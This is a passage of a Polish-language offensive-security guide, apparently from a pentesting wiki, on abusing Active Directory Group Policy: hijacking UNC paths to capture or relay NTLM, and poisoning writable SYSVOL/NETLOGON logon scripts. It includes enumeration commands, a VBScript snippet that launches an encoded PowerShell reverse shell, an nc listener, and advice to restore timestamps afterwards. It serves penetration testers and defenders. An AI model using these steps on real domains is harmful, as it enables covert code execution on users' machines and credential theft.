Mapowania dysków GPP w `Drives.xml` powodują, że użytkownicy uwierzytelniają się do skonfigurowanej ścieżki UNC podczas logowania lub ponownego łączenia. Jeśli spoofujesz wskazany host, możesz przechwycić **NetNTLMv2**. Jeśli celowo doprowadzisz do niepowodzenia SMB, Windows może ponowić próbę przez **WebDAV**, wysyłając **NTLM przez HTTP**, co zapewnia znacznie większą elastyczność w przypadku relay do **LDAP(S)**, **AD CS** lub **SMB**.

#### Logon/startup script UNC hijack

Ten sam schemat dotyczy skryptów hostowanych w UNC, znalezionych w `SYSVOL`:

- **Logon scripts** zwykle są uruchamiane w kontekście **użytkownika**.
- **Startup scripts** zwykle są uruchamiane w kontekście **komputera / SYSTEM**.

Jeśli ścieżka skryptu wskazuje nazwę hosta podatną na spoofing, przekieruj hosta UNC i udostępnij zastępczą treść skryptu w oczekiwanej lokalizacji.

## SYSVOL/NETLOGON Logon Script Poisoning

Zapisywalne ścieżki w `\\<dc>\SYSVOL\<domain>\scripts\` lub `\\<dc>\NETLOGON\` umożliwiają modyfikowanie skryptów logowania uruchamianych podczas logowania użytkownika za pośrednictwem GPO. Pozwala to na wykonanie kodu w kontekście bezpieczeństwa logujących się użytkowników.

### Znajdź skrypty logowania
- Sprawdź atrybuty użytkownika pod kątem skonfigurowanego skryptu logowania:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Przeszukaj udziały domenowe, aby znaleźć skróty lub odwołania do skryptów:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analizuj pliki `.lnk`, aby ustalić cele wskazujące na SYSVOL/NETLOGON (przydatna sztuczka DFIR oraz dla atakujących bez bezpośredniego dostępu do GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound wyświetla atrybut `scriptPath` obiektu użytkownika, jeśli jest ustawiony. Skrypty logowania skonfigurowane w GPO są osobną referencją do zasad, więc sprawdź również odpowiednie GPO.

### Zweryfikuj uprawnienia zapisu (nie ufaj listom udziałów)
Zautomatyzowane narzędzia mogą wskazywać SYSVOL/NETLOGON jako tylko do odczytu, nawet jeśli dokładny skrypt ma inną ACL NTFS. Zacznij od inspekcji tego pliku i jego katalogu nadrzędnego w trybie tylko do odczytu; pasujące wpisy ACE typu Allow nadal mogą mieć znaczenie, ponieważ liczą się efektywne uprawnienia SMB i NTFS, wpisy Deny ACE oraz bieżący token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Autoryzowany test zapisu powinien dotyczyć konkretnego celu i być odwracalny; przed jego wykonaniem należy utworzyć kopię zapasową oryginalnego skryptu, a po teście go przywrócić. Nie nadpisuj działającego skryptu logowania tylko po to, by przetestować dostęp — udany zapis może zostać uruchomiony podczas następnego logowania użytkownika.

### Zatruj skrypt logowania VBScript, aby uzyskać RCE
Dopisz polecenie uruchamiające PowerShell reverse shell (wygeneruj go na revshells.com) i zachowaj oryginalną logikę, aby nie zakłócić działania firmy:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Nasłuchuj na hoście i czekaj na następne interaktywne logowanie:

```bash
rlwrap -cAr nc -lnvp 443
```

Uwagi:
- Wykonanie odbywa się z tokenem użytkownika uruchamiającego skrypt rejestrowania (nie SYSTEM). Zakres obejmuje łącze GPO (OU, lokację lub domenę), w którym zastosowano ten skrypt.
- Po użyciu przywróć pierwotną zawartość i znaczniki czasu.


## References

- [1] [Nadużywanie ACL/ACE w Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Konta uprzywilejowane i uprawnienia tokenu](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – aktualizacja ścieżek ataków ACL](https://wald0.com/?p=112)
- [4] [Wyliczenie ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacja uprawnień za pomocą ACL w Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skanowanie uprawnień Active Directory i kont uprzywilejowanych](https://adsecurity.org/?p=3658)
- [7] [Konstruktor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operacje na atrybutach AD/UAC z Linuksa](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (członkostwo w grupie)](https://www.samba.org/)
- [10] [HTB Puppy: nadużywanie ACL w AD, łamanie Argon2 KeePassXC i odszyfrowywanie DPAPI w celu uzyskania uprawnień administratora DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: przejmowanie ścieżek UNC w GPO w celu wykonania kodu i przekazywania NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: wykorzystywanie GPO w Active Directory za pomocą przekazywania NTLM i nie tylko](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU sobie żartuje? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: wykorzystywanie ukrytych wektorów ataku ACL jednostek organizacyjnych w Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Symulowanie legalnych usług Active Directory w sieci: przypadek wykorzystania GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — przemieszczanie się między OU i nadużywanie dziedziczonych ACL](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
